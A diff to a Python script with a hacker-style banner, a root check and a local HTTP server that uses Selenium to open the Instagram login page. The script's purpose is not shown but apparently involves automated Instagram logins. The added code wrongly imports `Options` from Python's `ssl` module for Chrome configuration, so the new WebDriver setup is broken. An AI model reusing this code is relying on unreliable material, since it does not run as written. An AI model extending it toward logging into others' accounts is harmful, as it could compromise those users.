@@ -2,6 +2,7 @@
 
 import logging
 import os
+from ssl import Options
 import sys
 import time
 import re
@@ -15,8 +16,7 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 import getpass
 import math
-import time  
-
+import time 
 
 def check_root():
     return os.geteuid() == 0
@@ -68,6 +68,8 @@ print("\033[92m         #                                             #")
 print("\033[92m         ***********************************************")
 print("\033[92m\n\n")
 
+
+
 def validate_port(port):
     return re.match(r'^([1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$', port)
 
@@ -94,8 +96,11 @@ def run_server():
             self.end_headers()
             self.wfile.write(b"Hello, this is your custom server!")
 
-    # Initialize the Chrome WebDriver (replace with actual path to chromedriver)
-    driver = webdriver.Chrome(executable_path='/path/to/chromedriver')  # Use Chrome or Firefox
+    # Initialize Chrome WebDriver
+    chrome_options = Options()
+    chrome_options.add_argument('--no-sandbox')
+    chrome_options.add_argument('--headless')  # Optional: Run Chrome in headless mode
+    driver = webdriver.Chrome(executable_path='/usr/lib/chromium-browser/chromedriver', options=chrome_options)
 
     try:
         # Open Instagram login page
@@ -145,4 +150,4 @@ def run_server():
         httpd.serve_forever()
 
 if __name__ == "__main__":
-    run_server()
+       run_server()
